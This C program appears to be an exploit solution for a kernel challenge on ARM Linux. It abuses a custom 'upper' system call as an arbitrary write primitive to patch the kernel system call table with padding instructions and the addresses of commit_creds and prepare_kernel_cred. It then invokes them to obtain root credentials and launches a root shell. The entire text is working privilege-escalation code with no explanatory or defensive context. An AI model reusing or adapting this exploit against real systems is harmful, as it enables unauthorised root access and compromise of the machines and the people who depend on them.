#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>

#define SYS_CALL_TABLE 0x8000e348
#define SYS_UPPER 223

unsigned int **sct;
char *commit_creds = "\x60\xf5\x03\x80"; // 0x8003f56c - 0xc
char *prepare_kernel_cred = "\x24\xf9\x03\x80";
char *nop = "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1";

int main()
{
    sct = (unsigned int **)SYS_CALL_TABLE;

    syscall(SYS_UPPER, nop, 0x8003f56c - 0xc); // "nop" sled/padding
    syscall(SYS_UPPER, commit_creds, &sct[11]);
    syscall(SYS_UPPER, prepare_kernel_cred, &sct[12]);

    syscall(11, syscall(12, 0));
    system("/bin/sh");

    return 0;
}
